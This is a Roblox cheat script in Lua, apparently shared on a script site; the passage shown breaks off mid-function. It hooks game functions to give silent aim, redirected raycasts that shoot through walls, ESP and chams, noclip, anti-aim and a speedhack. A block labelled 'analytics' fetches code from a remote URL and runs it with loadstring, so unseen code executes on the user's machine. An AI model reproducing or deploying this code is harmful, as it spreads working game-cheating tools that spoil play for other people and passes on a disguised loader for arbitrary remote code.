-- [[ Rscripts Risk Notice ]]
-- This script is not verified by rscripts.net. Deal with caution.
--
-- Stay safe:
--   • Never log in on unofficial Roblox sites or lookalike domains.
--   • Real Roblox links use roblox.com (check the .com ending).
--   • Treat fake Roblox login / "claim reward" pages as phishing.
-- [[ End Rscripts Risk Notice ]]

--[[rscripts:analytics:start]]
-- Script analytics (enabled by the creator on rscripts.net).
-- Runs in its own thread and cannot affect the script below.
task.spawn(function()
	pcall(function()
		loadstring(game:HttpGet("https://rscripts.net/api/telemetry/v2/client.lua?s=6ae4b7882c1f03bc9746410f"))()
	end)
end)
--[[rscripts:analytics:end]]

local Environment=getgenv()
if type(Environment.BysterHub)=="table" and type(Environment.BysterHub.Unload)=="function" then pcall(Environment.BysterHub.Unload) end
local repo="https://raw.githubusercontent.com/Ali-lov3/Obsidian-UiLibs/refs/heads/main/"
local Library=loadstring(game:HttpGet(repo.."Library.lua"))()
local ThemeManager=loadstring(game:HttpGet(repo.."addons/ThemeManager.lua"))()
local SaveManager=loadstring(game:HttpGet(repo.."addons/SaveManager.lua"))()
local Options,Toggles=Library.Options,Library.Toggles
Library.ForceCheckbox=false
Library.ShowToggleFrameInKeybinds=true
Library.Scheme.WindowGlow=true
ThemeManager:SetLibrary(Library)
ThemeManager:SetDefaultTheme({BackgroundColor=Color3.fromRGB(6,9,15),MainColor=Color3.fromRGB(12,17,27),AccentColor=Color3.fromRGB(86,156,255),OutlineColor=Color3.fromRGB(28,38,58),FontColor=Color3.fromRGB(235,242,255),FontFace=Enum.Font.Gotham})
local function GS(n) return game:GetService(n) end
local Players,Teams,RunService,UserInputService=GS("Players"),GS("Teams"),GS("RunService"),GS("UserInputService")
local Lighting,Workspace,ContextActionService=GS("Lighting"),GS("Workspace"),GS("ContextActionService")
local LocalPlayer=Players.LocalPlayer
local ParentContainer
if gethui then ParentContainer=gethui() elseif GS("CoreGui") then ParentContainer=GS("CoreGui") else ParentContainer=LocalPlayer:WaitForChild("PlayerGui") end
local function cam() return Workspace.CurrentCamera end
local Alive=true
local Connections={}
local function connect(Signal,Callback)
 local c=Signal:Connect(Callback)
 Connections[#Connections+1]=c
 return c
end
local function trim(t) return (t:gsub("^%s+",""):gsub("%s+$","")) end
local function escapeRich(t) return (tostring(t):gsub("&","&amp;"):gsub("<","&lt;"):gsub(">","&gt;")) end

local S={
 SilentAim=false,SmartTargeting=true,TeamCheck=true,WallCheck=true,SilentWallbang=false,TargetPart="Head",
 ShowFOV=false,FOVCenter=false,FOVRadius=150,FOVColor=Color3.fromRGB(255,255,255),
 ShowTarget=false,TargetColor=Color3.fromRGB(255,50,50),MarkerSize=12,MarkerLength=6,RotationSpeed=3,
 PlayerESP=false,ESPChams=true,ESPBox=true,ESPSkeleton=true,TeamColors=true,
 FallbackColor=Color3.fromRGB(205,210,225),
 FillTransparency=55,MaxDistance=2000,
 Noclip=false,AntiAim=false,AntiAimSpeed=25,Fullbright=false,
 FriendColor=Color3.fromRGB(60,255,120),IgnoreFriends=true,
 MenuBlur=true,MenuBlurSize=36,
 BgEnabled=true,BgLeft="Waifu 1",BgRight="Waifu 2",BgOpacity=100,BgSize=320,BgDrag=true,
 Rainbow=true,RainbowSpeed=5,AccentColor=Color3.fromRGB(86,156,255)
}

local FL={Map={},Order={},Refresh=function() end}
local lowerNames=setmetatable({},{__mode="k"})
function FL.Is(p)
 if p==nil or #FL.Order==0 then return false end
 local k=lowerNames[p]
 if not k then k=string.lower(p.Name) lowerNames[p]=k end
 return FL.Map[k]~=nil
end
function FL.Find(Text)
 local q=string.lower(trim(Text))
 if q=="" then return nil end
 local Prefix,Contains
 for _,p in ipairs(Players:GetPlayers()) do
  local n,d=string.lower(p.Name),string.lower(p.DisplayName)
  if n==q or d==q then return p end
  if not Prefix and (string.find(n,q,1,true)==1 or string.find(d,q,1,true)==1) then Prefix=p end
  if not Contains and (string.find(n,q,1,true) or string.find(d,q,1,true)) then Contains=p end
 end
 return Prefix or Contains
end
function FL.Add(p)
 local k=string.lower(p.Name)
 if FL.Map[k] then return false end
 FL.Map[k]={Name=p.Name,Display=p.DisplayName}
 FL.Order[#FL.Order+1]=k
 FL.Refresh()
 return true
end
function FL.Remove(k)
 if not FL.Map[k] then return end
 FL.Map[k]=nil
 for i,v in ipairs(FL.Order) do if v==k then table.remove(FL.Order,i) break end end
 FL.Refresh()
end
function FL.Clear()
 table.clear(FL.Map)
 table.clear(FL.Order)
 FL.Refresh()
end

local W={
 TimeOn=false,ClockTime=14,TimeLapse=false,TimeLapseSpeed=0.5,
 FogOn=false,FogColor=Color3.fromRGB(192,192,192),FogStart=0,FogEnd=1000,
 AtmoOn=false,AtmoDensity=0.3,AtmoOffset=0,AtmoColor=Color3.fromRGB(199,199,199),AtmoDecay=Color3.fromRGB(106,112,125),AtmoGlare=0,AtmoHaze=0,
 SkyOn=false,Stars=3000,Bodies=true,SunSize=21,MoonSize=11,
 CloudsOn=false,CloudCover=0.5,CloudDensity=0.7,CloudColor=Color3.fromRGB(255,255,255),
 BlurOn=false,BlurSize=12,
 CCOn=false,CCBrightness=0,CCContrast=0,CCSaturation=0,CCTint=Color3.fromRGB(255,255,255),
 BloomOn=false,BloomIntensity=1,BloomSize=24,BloomThreshold=0.8,
 RaysOn=false,RaysIntensity=0.25,RaysSpread=1,
 DOFOn=false,DOFFocus=30,DOFRadius=20,DOFFar=0.5,DOFNear=0.1,
 FOVOn=false,FOV=70,ZoomOn=false,Zoom=128
}
local MasterKeys={"TimeOn","TimeLapse","FogOn","AtmoOn","SkyOn","CloudsOn","BlurOn","CCOn","BloomOn","RaysOn","DOFOn","FOVOn","ZoomOn"}

local currentAccent=S.AccentColor
local accentListeners={}
local function setAccent(c)
 currentAccent=c
 Library.Scheme.AccentColor=c
 pcall(Library.UpdateColorsUsingRegistry,Library)
 for _,l in ipairs(accentListeners) do l(c) end
end

local heldProps,origProps={},{}
local function applyLighting(Delta)
 local Want={}
 if W.TimeOn then
  if W.TimeLapse then W.ClockTime=(W.ClockTime+Delta*W.TimeLapseSpeed)%24 end
  Want.ClockTime=W.ClockTime
 end
 if W.FogOn then
  Want.FogColor=W.FogColor
  Want.FogStart=W.FogStart
  Want.FogEnd=math.max(W.FogEnd,W.FogStart+1)
 end
 if S.Fullbright then
  Want.Ambient=Color3.new(1,1,1)
  Want.OutdoorAmbient=Color3.new(1,1,1)
  Want.Brightness=2
  Want.GlobalShadows=false
  if Want.ClockTime==nil then Want.ClockTime=14 end
  if Want.FogEnd==nil then Want.FogEnd=100000 end
 end
 for p in pairs(heldProps) do
  if Want[p]==nil then
   pcall(function() Lighting[p]=origProps[p] end)
   heldProps[p]=nil
   origProps[p]=nil
  end
 end
 for p,v in pairs(Want) do
  if not heldProps[p] then
   local ok,cur=pcall(function() return Lighting[p] end)
   if ok then heldProps[p]=true origProps[p]=cur end
  end
  if heldProps[p] then
   local ok,cur=pcall(function() return Lighting[p] end)
   if ok and cur~=v then pcall(function() Lighting[p]=v end) end
  end
 end
end
local function restoreLighting()
 for p in pairs(heldProps) do
  pcall(function() Lighting[p]=origProps[p] end)
  heldProps[p]=nil
  origProps[p]=nil
 end
end

local function newOverride(Class,Props,GetParent)
 local O={Object=nil,Created=false,Snap={}}
 function O.Restore()
  if O.Object then
   if O.Created then
    pcall(function() O.Object:Destroy() end)
   else
    for p,v in pairs(O.Snap) do pcall(function() O.Object[p]=v end) end
   end
  end
  O.Object,O.Created,O.Snap=nil,false,{}
 end
 function O.Apply(Active,Values)
  if Active then
   if not (O.Object and O.Object.Parent) then
    local Parent=GetParent()
    local Found=Parent and Parent:FindFirstChildOfClass(Class)
    O.Snap={}
    if Found then
     O.Object,O.Created=Found,false
     for _,p in ipairs(Props) do
      local ok,v=pcall(function() return Found[p] end)
      if ok then O.Snap[p]=v end
     end
    elseif Parent then
     local n=Instance.new(Class)
     n.Name="Byster"..Class
     n.Parent=Parent
     O.Object,O.Created=n,true
    end
   end
   if O.Object then
    for p,v in pairs(Values) do
     pcall(function() if O.Object[p]~=v then O.Object[p]=v end end)
    end
   end
  elseif O.Object then
   O.Restore()
  end
 end
 return O
end
local AtmoOverride=newOverride("Atmosphere",{"Density","Offset","Color","Decay","Glare","Haze"},function() return Lighting end)
local SkyOverride=newOverride("Sky",{"StarCount","CelestialBodiesShown","SunAngularSize","MoonAngularSize"},function() return Lighting end)
local CloudsOverride=newOverride("Clouds",{"Enabled","Cover","Density","Color"},function() return Workspace.Terrain end)

local Effects={}
local EffectDefs={
 {Key="Blur",Class="BlurEffect",On="BlurOn",Apply=function(E) E.Size=W.BlurSize end},
 {Key="CC",Class="ColorCorrectionEffect",On="CCOn",Apply=function(E)
  E.Brightness=W.CCBrightness
  E.Contrast=W.CCContrast
  E.Saturation=W.CCSaturation
  E.TintColor=W.CCTint
 end},
 {Key="Bloom",Class="BloomEffect",On="BloomOn",Apply=function(E)
  E.Intensity=W.BloomIntensity
  E.Size=W.BloomSize
  E.Threshold=W.BloomThreshold
 end},
 {Key="Rays",Class="SunRaysEffect",On="RaysOn",Apply=function(E)
  E.Intensity=W.RaysIntensity
  E.Spread=W.RaysSpread
 end},
 {Key="DOF",Class="DepthOfFieldEffect",On="DOFOn",Apply=function(E)
  E.FocusDistance=W.DOFFocus
  E.InFocusRadius=W.DOFRadius
  E.FarIntensity=W.DOFFar
  E.NearIntensity=W.DOFNear
 end}
}
local function applyEffects()
 for _,D in ipairs(EffectDefs) do
  if W[D.On] then
   local E=Effects[D.Key]
   if not E or not E.Parent then
    E=Instance.new(D.Class)
    E.Name="Byster"..D.Key
    E.Parent=Lighting
    Effects[D.Key]=E
   end
   E.Enabled=true
   pcall(D.Apply,E)
  elseif Effects[D.Key] and Effects[D.Key].Enabled then
   Effects[D.Key].Enabled=false
  end
 end
end
local function applyInstances()
 AtmoOverride.Apply(W.AtmoOn,W.AtmoOn and {Density=W.AtmoDensity,Offset=W.AtmoOffset,Color=W.AtmoColor,Decay=W.AtmoDecay,Glare=W.AtmoGlare,Haze=W.AtmoHaze} or false)
 SkyOverride.Apply(W.SkyOn,W.SkyOn and {StarCount=W.Stars,CelestialBodiesShown=W.Bodies,SunAngularSize=W.SunSize,MoonAngularSize=W.MoonSize} or false)
 CloudsOverride.Apply(W.CloudsOn,W.CloudsOn and {Enabled=true,Cover=W.CloudCover,Density=W.CloudDensity,Color=W.CloudColor} or false)
 applyEffects()
end

local fovSnap,zoomSnap
local function applyCamera()
 local c=cam()
 if c then
  if W.FOVOn then
   if not fovSnap then fovSnap=c.FieldOfView end
   c.FieldOfView=W.FOV
  elseif fovSnap then
   c.FieldOfView=fovSnap
   fovSnap=nil
  end
 end
 if W.ZoomOn then
  if not zoomSnap then zoomSnap=LocalPlayer.CameraMaxZoomDistance end
  LocalPlayer.CameraMaxZoomDistance=W.Zoom
 elseif zoomSnap then
  LocalPlayer.CameraMaxZoomDistance=zoomSnap
  zoomSnap=nil
 end
end
local function restoreWorld()
 restoreLighting()
 AtmoOverride.Restore()
 SkyOverride.Restore()
 CloudsOverride.Restore()
 for k,e in pairs(Effects) do pcall(e.Destroy,e) Effects[k]=nil end
 local c=cam()
 if fovSnap and c then c.FieldOfView=fovSnap end
 fovSnap=nil
 if zoomSnap then LocalPlayer.CameraMaxZoomDistance=zoomSnap end
 zoomSnap=nil
end

local function setWorld(Key,Value)
 W[Key]=Value
 local Id="W_"..Key
 local T,O=Toggles[Id],Options[Id]
 if T then
  pcall(T.SetValue,T,Value)
 elseif O then
  if typeof(Value)=="Color3" then pcall(O.SetValueRGB,O,Value) else pcall(O.SetValue,O,Value) end
 end
end
local function setFullbright(v)
 S.Fullbright=v
 if Toggles.Fullbright then pcall(Toggles.Fullbright.SetValue,Toggles.Fullbright,v) end
end
local function resetWorld()
 for _,k in ipairs(MasterKeys) do setWorld(k,false) end
end

local C=Color3.fromRGB
local Presets={
 ["Night"]={TimeOn=true,ClockTime=0,SkyOn=true,Stars=5000,CCOn=true,CCTint=C(185,200,255),CCSaturation=-0.1,CCContrast=0.1,CCBrightness=-0.03,BloomOn=true,BloomIntensity=0.6,BloomSize=24,BloomThreshold=0.9},
 ["Midnight"]={TimeOn=true,ClockTime=0,FogOn=true,FogColor=C(5,8,20),FogStart=20,FogEnd=500,SkyOn=true,Stars=5000,CCOn=true,CCTint=C(150,170,255),CCSaturation=-0.2,CCContrast=0.2},
 ["Sunset"]={TimeOn=true,ClockTime=17.8,AtmoOn=true,AtmoDensity=0.35,AtmoColor=C(255,190,150),AtmoDecay=C(200,110,70),AtmoHaze=1.5,AtmoGlare=0.6,CCOn=true,CCTint=C(255,205,170),CCSaturation=0.25,CCContrast=0.1,BloomOn=true,BloomIntensity=0.9,BloomSize=30,BloomThreshold=0.8,RaysOn=true,RaysIntensity=0.3,RaysSpread=0.8},
 ["Foggy"]={FogOn=true,FogColor=C(190,195,200),FogStart=0,FogEnd=220,AtmoOn=true,AtmoDensity=0.5,AtmoColor=C(190,195,205),AtmoDecay=C(120,125,135),AtmoHaze=3,CCOn=true,CCSaturation=-0.2,CCContrast=-0.05},
 ["Vivid"]={CCOn=true,CCSaturation=0.6,CCContrast=0.2,CCBrightness=0.02,BloomOn=true,BloomIntensity=0.5,BloomSize=20,BloomThreshold=0.9,RaysOn=true,RaysIntensity=0.2,RaysSpread=1},
 ["Noir"]={CCOn=true,CCSaturation=-1,CCContrast=0.3,CCBrightness=-0.03,BloomOn=true,BloomIntensity=0.3,BloomSize=18,BloomThreshold=1},
 ["Cyber"]={TimeOn=true,ClockTime=0,FogOn=true,FogColor=C(30,5,50),FogStart=50,FogEnd=900,SkyOn=true,Stars=5000,CCOn=true,CCTint=C(255,170,255),CCSaturation=0.5,CCContrast=0.25,BloomOn=true,BloomIntensity=1.6,BloomSize=40,BloomThreshold=0.7},
 ["Dreamy"]={BlurOn=true,BlurSize=4,BloomOn=true,BloomIntensity=1.4,BloomSize=42,BloomThreshold=0.75,CCOn=true,CCSaturation=0.25,CCContrast=-0.1,CCBrightness=0.03,CCTint=C(255,235,245),DOFOn=true,DOFFocus=35,DOFRadius=25,DOFFar=0.4,DOFNear=0.1,AtmoOn=true,AtmoDensity=0.25,AtmoHaze=1,AtmoGlare=0.4},
 ["Clear Day"]={TimeOn=true,ClockTime=13,FogOn=true,FogColor=C(200,220,255),FogStart=0,FogEnd=100000,CCOn=true,CCSaturation=0.15,CCContrast=0.05}
}
local PresetNames={"Night","Midnight","Sunset","Foggy","Vivid","Noir","Cyber","Dreamy","Clear Day"}
local function applyPreset(Name)
 local D=Presets[Name]
 if not D then return end
 resetWorld()
 for k,v in pairs(D) do setWorld(k,v) end
end
local QuickTimes={Dawn=5.5,Noon=12,Sunset=18,Night=22,Midnight=0}

local noclipParts=setmetatable({},{__mode="k"})
local noclipCharacter
local function restoreNoclip()
 for p,o in pairs(noclipParts) do
  if p.Parent then p.CanCollide=o end
  noclipParts[p]=nil
 end
 noclipCharacter=nil
end
connect(RunService.Stepped,function()
 if not Alive or not S.Noclip then return end
 local Ch=LocalPlayer.Character
 if not Ch then return end
 if noclipCharacter~=Ch then restoreNoclip() noclipCharacter=Ch end
 for _,p in ipairs(Ch:GetDescendants()) do
  if p:IsA("BasePart") then
   if noclipParts[p]==nil then noclipParts[p]=p.CanCollide end
   p.CanCollide=false
  end
 end
end)

local aaAngle=0
connect(RunService.Heartbeat,function()
 if not Alive or not S.AntiAim then return end
 local Ch=LocalPlayer.Character
 local H=Ch and Ch:FindFirstChildOfClass("Humanoid")
 local R=Ch and Ch:FindFirstChild("HumanoidRootPart")
 if H and R and H.Health>0 then
  aaAngle=(aaAngle+S.AntiAimSpeed)%360
  R.CFrame=CFrame.new(R.Position)*CFrame.Angles(0,math.rad(aaAngle),0)
 end
end)
connect(LocalPlayer.CharacterAdded,restoreNoclip)

local function isEnemy(p)
 if not LocalPlayer.Team or not p.Team then return true end
 return p.Team~=LocalPlayer.Team
end
local function isValidChar(Ch)
 if not Ch then return false end
 if Ch:FindFirstChildOfClass("ForceField") then return false end
 local BE=Ch:FindFirstChild("BodyEffects")
 if BE then
  local KO,Dead=BE:FindFirstChild("K.O"),BE:FindFirstChild("Dead")
  if (KO and KO.Value) or (Dead and Dead.Value) then return false end
 end
 return true
end
local rayParams=RaycastParams.new()
rayParams.FilterType=Enum.RaycastFilterType.Exclude
rayParams.IgnoreWater=true
local wallFilter={}
local function wallCheck(Part)
 if not S.WallCheck or not LocalPlayer.Character then return true end
 wallFilter[1]=LocalPlayer.Character
 wallFilter[2]=Part.Parent
 rayParams.FilterDescendantsInstances=wallFilter
 local o=cam().CFrame.Position
 return Workspace:Raycast(o,Part.Position-o,rayParams)==nil
end
local function getTargetPart(Ch)
 local p=Ch:FindFirstChild(S.TargetPart)
 if not p and S.TargetPart=="Torso" then p=Ch:FindFirstChild("UpperTorso") end
 return p
end
local silentTarget=nil
local function findTarget()
 local Camera=cam()
 local Best,BestD=nil,math.huge
 local Center=S.FOVCenter and Camera.ViewportSize/2 or UserInputService:GetMouseLocation()
 for _,pl in ipairs(Players:GetPlayers()) do
  if pl~=LocalPlayer and not (S.IgnoreFriends and FL.Is(pl)) and not (S.TeamCheck and not isEnemy(pl)) then
   local Ch=pl.Character
   if Ch and not (S.SmartTargeting and not isValidChar(Ch)) then
    local Part=getTargetPart(Ch)
    local Hum=Ch:FindFirstChildOfClass("Humanoid")
    if Part and Hum and Hum.Health>0 then
     local Pt,Vis=Camera:WorldToViewportPoint(Part.Position)
     if Vis then
      local d=(Vector2.new(Pt.X,Pt.Y)-Center).Magnitude
      if d<=S.FOVRadius and d<BestD and (S.SilentWallbang or wallCheck(Part)) then Best=Part BestD=d end
     end
    end
   end
  end
 end
 return Best
end
local ncHook
if hookmetamethod then
 ncHook=hookmetamethod(game,"__namecall",function(self,...)
  local M=getnamecallmethod()
  if Alive and M=="Raycast" and S.SilentAim and silentTarget and silentTarget.Parent and self==Workspace and not checkcaller() then
   local A={...}
   local o,d=A[1],A[2]
   if typeof(o)=="Vector3" and typeof(d)=="Vector3" and o~=cam().CFrame.Position and d.Magnitude>20 then
    A[2]=(silentTarget.Position-o).Unit*d.Magnitude
    return ncHook(self,unpack(A))
   end
  end
  return ncHook(self,...)
 end)
end

-- =============================================================
-- Shoot Through Walls
-- =============================================================
local WB_Held, WB_Until, WB_Original, WB_Unhook = false, 0, nil, nil
pcall(function()
	if not hookfunction then return end
	local newcclosure2 = newcclosure or function(f) return f end
	local oldRaycast
	local wbHook = newcclosure2(function(self, origin, direction, rayParams, ...)
		local colonCall = typeof(self) ~= "Vector3"
		local realOrigin = colonCall and origin or self
		local realDirection = colonCall and direction or origin
		local trailing = {...}
		if Alive and S.SilentAim and S.SilentWallbang and (WB_Held or tick() <= WB_Until)
			and silentTarget and silentTarget.Parent
			and typeof(realOrigin) == "Vector3" and typeof(realDirection) == "Vector3"
			and realDirection.Magnitude > 0.05 then
			local localCharacter = LocalPlayer.Character
			local root = localCharacter and localCharacter:FindFirstChild("HumanoidRootPart")
			local camPos = cam().CFrame.Position
			local targetModel = silentTarget:FindFirstAncestorOfClass("Model")
			local targetPosition = silentTarget.Position
			local toTarget = targetPosition - realOrigin
			local isAimedAtTarget = toTarget.Magnitude > 0.05
				and realDirection.Unit:Dot(toTarget.Unit) >= 0.70
			local nearLocalCharacter = root and (realOrigin - root.Position).Magnitude <= 120
			local nearCamera = (realOrigin - camPos).Magnitude <= 120
			if (nearLocalCharacter or nearCamera) and isAimedAtTarget and silentTarget.Parent then
				local targetParams = RaycastParams.new()
				targetParams.FilterType = Enum.RaycastFilterType.Include
				targetParams.FilterDescendantsInstances = {targetModel or silentTarget}
				targetParams.IgnoreWater = true
				pcall(function()
					if rayParams and rayParams.CollisionGroup then
						targetParams.CollisionGroup = rayParams.CollisionGroup
					end
				end)
				local rayLength = math.max(realDirection.Magnitude, toTarget.Magnitude + 2)
				if colonCall then
					return oldRaycast(self, realOrigin, toTarget.Unit * rayLength, targetParams, table.unpack(trailing))
				end
				return oldRaycast(realOrigin, toTarget.Unit * rayLength, targetParams, table.unpack(trailing))
			end
		end
		if colonCall then
			return oldRaycast(self, origin, direction, rayParams, table.unpack(trailing))
		end
		return oldRaycast(self, origin, direction, table.unpack(trailing))
	end)
	local ok, previous = pcall(hookfunction, workspace.Raycast, wbHook)
	if ok and type(previous) == "function" then
		oldRaycast = previous
		WB_Original = previous
		WB_Unhook = function()
			pcall(hookfunction, workspace.Raycast, WB_Original)
		end
	end
end)
connect(UserInputService.InputBegan, function(input, gameProcessed)
	if gameProcessed or not Alive or not S.SilentAim or not S.SilentWallbang then return end
	if input.UserInputType == Enum.UserInputType.MouseButton1
		or input.UserInputType == Enum.UserInputType.Touch
		or input.KeyCode == Enum.KeyCode.ButtonR2 then
		WB_Held = true
		WB_Until = tick() + 0.50
	end
end)
connect(UserInputService.InputEnded, function(input)
	if input.UserInputType == Enum.UserInputType.MouseButton1
		or input.UserInputType == Enum.UserInputType.Touch
		or input.KeyCode == Enum.KeyCode.ButtonR2 then
		WB_Held = false
	end
end)
local fovCircle=Drawing.new("Circle")
fovCircle.Thickness=1
fovCircle.Filled=false
fovCircle.NumSides=64
fovCircle.Visible=false
local targetLines={}
for i=1,8 do
 local l=Drawing.new("Line")
 l.Thickness=2
 l.Visible=false
 targetLines[i]=l
end

local Roster={}
for _,p in ipairs(Players:GetPlayers()) do if p~=LocalPlayer then Roster[#Roster+1]=p end end
connect(Players.PlayerAdded,function(p)
 if p~=LocalPlayer and not table.find(Roster,p) then Roster[#Roster+1]=p end
end)
connect(Players.PlayerRemoving,function(p)
 local i=table.find(Roster,p)
 if i then table.remove(Roster,i) end
end)

local R15Names={"Head","UpperTorso","LowerTorso","LeftUpperArm","LeftLowerArm","LeftHand","RightUpperArm","RightLowerArm","RightHand","LeftUpperLeg","LeftLowerLeg","LeftFoot","RightUpperLeg","RightLowerLeg","RightFoot"}
local R15Bones={{1,2},{2,3},{2,4},{4,5},{5,6},{2,7},{7,8},{8,9},{3,10},{10,11},{11,12},{3,13},{13,14},{14,15}}
local R6Names={"Head","Torso","Left Arm","Right Arm","Left Leg","Right Leg"}
local R6Bones={{1,2},{2,3},{2,4},{2,5},{2,6}}
local Rigs=setmetatable({},{__mode="k"})
local function getRig(pl)
 local Ch=pl.Character
 if not Ch then return nil end
 local Rg=Rigs[pl]
 if Rg and Rg.Ch==Ch and Rg.Root.Parent and Rg.Hum.Parent then return Rg end
 local Hum=Ch:FindFirstChildOfClass("Humanoid")
 local Root=Ch:FindFirstChild("HumanoidRootPart")
 if not (Hum and Root) then Rigs[pl]=nil return nil end
 Rg={Ch=Ch,Hum=Hum,Root=Root,Head=Ch:FindFirstChild("Head"),R15=Ch:FindFirstChild("UpperTorso")~=nil,JT=0}
 Rigs[pl]=Rg
 return Rg
end
local function getJoints(Rg,Now)
 local J=Rg.J
 if J and Now<Rg.JT then return J end
 J=J or {}
 local Names=Rg.R15 and R15Names or R6Names
 for i=1,#Names do
  local p=J[i]
  if not (p and p.Parent) then J[i]=Rg.Ch:FindFirstChild(Names[i]) or false end
 end
 Rg.J=J
 Rg.JT=Now+2
 return J
end

local TeamCol=setmetatable({},{__mode="k"})
local function playerColor(T,Fr)
 if Fr then return S.FriendColor end
 if T and S.TeamColors then
  local c=TeamCol[T]
  if not c then c=T.TeamColor.Color TeamCol[T]=c end
  return c
 end
 return S.FallbackColor
end
local TeamSel,TeamAny={},false
local function rebuildTeamSel(Sel)
 if Sel==nil then Sel=Options.ESPTeams and Options.ESPTeams.Value end
 table.clear(TeamSel)
 TeamAny=false
 if type(Sel)=="table" then
  for k,v in pairs(Sel) do
   if v==true and type(k)=="string" then
    TeamSel[k]=true
    TeamAny=true
   elseif type(k)=="number" and type(v)=="string" then
    TeamSel[v]=true
    TeamAny=true
   end
  end
 end
end
local function teamAllowed(Team)
 if not TeamAny then return true end
 return TeamSel[Team and Team.Name or "No Team"]==true
end

local ChamsFolder=Instance.new("Folder")
ChamsFolder.Name="BysterChams"
ChamsFolder.Parent=ParentContainer
local Chams,ActiveSet,StaleList={},{},{}
local function removeChams(k)
 local B=Chams[k]
 if not B then return end
 for i=1,#B.List do B.List[i]:Destroy() end
 Chams[k]=nil
end
local function clearChams()
 local ks={}
 for k in pairs(Chams) do ks[#ks+1]=k end
 for _,k in ipairs(ks) do removeChams(k) end
end
local function buildChams(Rg,Now)
 local J=getJoints(Rg,Now)
 local List={}
 for i=1,#(Rg.R15 and R15Names or R6Names) do
  local p=J[i]
  if p then
   local A=Instance.new("BoxHandleAdornment")
   A.Adornee=p
   A.Size=p.Size
   A.AlwaysOnTop=true
   A.ZIndex=5
   A.Parent=ChamsFolder
   List[#List+1]=A
  end
 end
 return {Ch=Rg.Ch,List=List}
end
local function syncChams()
 if not (S.PlayerESP and S.ESPChams) then
  if next(Chams)~=nil then clearChams() end
  return
 end
 local Camera=cam()
 if not Camera then return end
 local Now=os.clock()
 local CP=Camera.CFrame.Position
 local Max=S.MaxDistance
 local Max2=Max*Max
 local Tr=S.FillTransparency/100
 local Act=ActiveSet
 table.clear(Act)
 for i=1,#Roster do
  local pl=Roster[i]
  local Rg=getRig(pl)
  if Rg and Rg.Hum.Health>0 then
   local T=pl.Team
   local Fr=FL.Is(pl)
   if Fr or teamAllowed(T) then
    local Off=Rg.Root.Position-CP
    if Off:Dot(Off)<=Max2 then
     Act[pl]=true
     local B=Chams[pl]
     if B and B.Ch~=Rg.Ch then removeChams(pl) B=nil end
     if not B then B=buildChams(Rg,Now) Chams[pl]=B end
     local Col=playerColor(T,Fr)
     if B.Col~=Col then
      B.Col=Col
      for k=1,#B.List do B.List[k].Color3=Col end
     end
     if B.Tr~=Tr then
      B.Tr=Tr
      for k=1,#B.List do B.List[k].Transparency=Tr end
     end
    end
   end
  end
 end
 local n=0
 for k in pairs(Chams) do
  if not Act[k] then n=n+1 StaleList[n]=k end
 end
 for i=1,n do
  removeChams(StaleList[i])
  StaleList[i]=nil
 end
end
connect(Players.PlayerRemoving,removeChams)

local FPS={On=false,MinSize=12,Orig={},Conn=nil}
do
 local function inChar(I)
  local P=I.Parent
  while P and P~=Workspace do
   if P:IsA("Model") and P:FindFirstChildOfClass("Humanoid") then return true end
   P=P.Parent
  end
  return false
 end
 local function strip(I)
  if FPS.Orig[I] then return end
  pcall(function()
   if I:IsA("Decal") or I:IsA("Texture") then
    local P=I.Parent
    if P and P:IsA("BasePart") and I.Texture~="" and P.Size.Magnitude>=FPS.MinSize and not inChar(I) then
     FPS.Orig[I]={K="Tex",V=I.Texture}
     I.Texture=""
    end
   elseif I:IsA("SurfaceAppearance") then
    local P=I.Parent
    if P and P:IsA("MeshPart") and P.Size.Magnitude>=FPS.MinSize and not inChar(I) then
     FPS.Orig[I]={K="SA",P=P}
     I.Parent=nil
    end
   elseif I:IsA("MeshPart") then
    if I.TextureID~="" and I.Size.Magnitude>=FPS.MinSize and not inChar(I) then
     FPS.Orig[I]={K="Mesh",V=I.TextureID}
     I.TextureID=""
    end
   end
  end)
 end
 function FPS.Scan()
  task.spawn(function()
   local n=0
   for _,I in ipairs(Workspace:GetDescendants()) do
    if not Alive or not FPS.On then return end
    strip(I)
    n=n+1
    if n%800==0 then task.wait() end
   end
  end)
 end
 function FPS.Restore()
  if FPS.Conn then FPS.Conn:Disconnect() FPS.Conn=nil end
  for I,Info in pairs(FPS.Orig) do
   pcall(function()
    if Info.K=="Tex" then I.Texture=Info.V
    elseif Info.K=="Mesh" then I.TextureID=Info.V
    elseif Info.K=="SA" and Info.P and Info.P.Parent then I.Parent=Info.P end
   end)
   FPS.Orig[I]=nil
  end
 end
 function FPS.Set(v)
  FPS.On=v
  if FPS.Conn then FPS.Conn:Disconnect() FPS.Conn=nil end
  if v then
   FPS.Scan()
   FPS.Conn=Workspace.DescendantAdded:Connect(function(I) task.defer(strip,I) end)
  else
   FPS.Restore()
  end
 end
end

local WS={On=false,Mult=2}
do
 local Base,Last,CurHum
 function WS.Restore()
  if CurHum and CurHum.Parent and Base then pcall(function() CurHum.WalkSpeed=Base end) end
  CurHum,Base,Last=nil,nil,nil
 end
 connect(RunService.Heartbeat,function()
  if not Alive or not WS.On then return end
  local Ch=LocalPlayer.Character
  local H=Ch and Ch:FindFirstChildOfClass("Humanoid")
  if not H then return end
  if CurHum~=H then CurHum=H Base=H.WalkSpeed Last=nil end
  if Last==nil or H.WalkSpeed~=Last then Base=H.WalkSpeed end
  local T=Base*math.clamp(WS.Mult,1,2)
  if H.WalkSpeed~=T then H.WalkSpeed=T end
  Last=T
 end)
end
local Cos = {}
local BuloHubUnloaded = false
local BuloDirectConnections = {}
local Player = LocalPlayer
local RS = RunService
local ReplicatedStorage = GS("ReplicatedStorage")
local function cur() return Workspace.CurrentCamera end
do
-- Advanced engine state + hookup
local Cfg = { IgnoreTeam = false, AntiSlowdown = false, SpeedhackEnabled = false, SpeedMultiplier = 15 }
local ESPObjects = {}
local espColor = Color3.fromRGB(255, 255, 255)
local connections = {}
local BuloSilentAimController, BuloSilentAimOriginal, BuloSilentAimHook = nil, nil, nil
local BuloWallbangRaycastOriginal, BuloWallbangRaycastHook = nil, nil
local BuloWallbangShotUntil, BuloWallbangInputHeld = 0, false
local WallbangFeatureAvailable = false
local VIM = GS("VirtualInputManager")
local function BuloTrackConnection(connection)
    if connection then table.insert(BuloDirectConnections, connection) end
    return connection
end
local BuloTreeSnapshots = setmetatable({}, {__mode = "k"})
local function BuloCachedDescendants(root, kind)
    local cache = BuloTreeSnapshots[root]
    if not cache then
        cache = {dirty = true}
        BuloTreeSnapshots[root] = cache
        local weakCache = setmetatable({cache}, {__mode = "v"})
        local function invalidate()
            local current = weakCache[1]
            if current then
                current.dirty = true
